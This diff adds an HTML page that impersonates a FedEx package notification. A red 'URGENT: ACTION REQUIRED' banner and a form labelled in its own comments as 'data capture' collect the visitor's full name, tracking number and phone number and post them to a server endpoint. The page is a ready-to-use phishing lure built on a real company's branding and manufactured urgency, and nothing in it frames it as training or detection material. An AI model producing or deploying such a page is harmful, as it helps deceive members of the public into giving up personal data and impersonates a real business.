@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FedEx Package Notification - Action Required</title>
+    <style>
+        /* Global Styles & Urgency Theme */
+        :root {
+            --fedex-blue: #005896;
+            --fedex-dark: #003366;
+            --accent-red: #C41E3A;
+            --text-color: #333;
+            --success-green: #28a745;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7f9; /* Light background for contrast */
+            color: var(--text-color);
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Start from the top */
+            min-height: 100vh;
+        }
+
+        .form-container {
+            max-width: 650px;
+            width: 100%;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); /* Deep shadow for prominence */
+            border-top: 8px solid var(--fedex-blue); /* Strong visual anchor */
+        }
+
+        /* Header & Urgency Section */
+        .header-alert {
+            background-color: var(--accent-red);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .header-alert h2 {
+            margin: 0;
+            font-size: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .header-alert p {
+            margin: 5px 0 0;
+            font-size: 1.1rem;
+            font-weight: 300;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            color: var(--fedex-dark);
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--fedex-blue);
+            outline: none;
+            box-shadow: 0 0 8px rgba(0, 88, 150, 0.3);
+        }
+
+        /* Specific field styling */
+        #name_field {
+            /* Style for the top name field */
+            border-left: 5px solid var(--accent-red);
+        }
+
+        #phone_field {
+            /* Style for the bottom phone field, making it stand out */
+            border: 2px solid var(--fedex-blue);
+        }
+
+        /* Submission Button */
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background-color: var(--success-green);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.25rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.1s;
+            margin-top: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            background-color: #218838; /* Darker green on hover */
+            transform: translateY(-2px);
+        }
+
+        /* Footer/Details */
+        .package-info {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px dashed #ccc;
+            font-size: 0.95rem;
+            color: #555;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+
+        <!-- URGENCY BANNER -->
+        <div class="header-alert">
+            <h2>🚨 URGENT: ACTION REQUIRED 🚨</h2>
+            <p>Package awaiting verification and delivery dispatch.</p>
+        </div>
+
+        <!-- FORM FOR DATA CAPTURE -->
+        <form id="notificationForm" method="POST" action="/api/">
+
+            <!-- 1. NAME FIELD (Top Priority) -->
+            <div class="form-group">
+                <label for="name_field">Full Name (Recipient):</label>
+                <input type="text" id="name_field" name="name" placeholder="Enter full name as it appears on ID/Package" required>
+            </div>
+
+            <!-- 2. SECONDARY INFO (For extra verification, if needed) -->
+            <div class="form-group">
+                <label for="tracking_id">Tracking ID / Reference #: </label>
+                <input type="text" id="tracking_id" name="tracking_id" placeholder="E.g., FEDX123456789" required>
+            </div>
+
+            <!-- 3. PHONE NUMBER FIELD (Bottom Priority) -->
+            <div class="form-group">
+                <label for="phone_field">Contact Phone Number:</label>
+                <input type="tel" id="phone_field" name="phone" placeholder="(123) 456-7890" required>
+            </div>
+
+            <!-- SUBMIT BUTTON -->
+            <button type="submit" class="submit-btn">
+                VERIFY & PROCESS PACKAGE
+            </button>
+        </form>
+
+        <!-- PACKAGE DETAILS/REFERENCE -->
+        <div class="package-info">
+            <p><strong>Shipment Details:</strong> Document Processing / Commercial Goods</p>
+            <p><strong>Estimated Clearance:</strong> Immediate Verification Required</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
